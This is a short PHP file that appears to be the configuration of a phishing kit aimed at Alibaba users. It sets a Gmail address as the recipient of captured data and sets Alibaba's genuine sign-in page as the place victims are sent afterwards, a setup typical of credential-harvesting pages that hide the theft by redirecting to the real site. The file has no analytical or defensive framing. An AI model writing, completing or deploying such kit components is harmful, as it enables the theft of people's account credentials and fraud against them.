<?php


$to = "resultdruzzy@gmail.com";

//Redirect-to location?
$location ="https://login.alibaba.com/?tracelog=hd_signin";

?>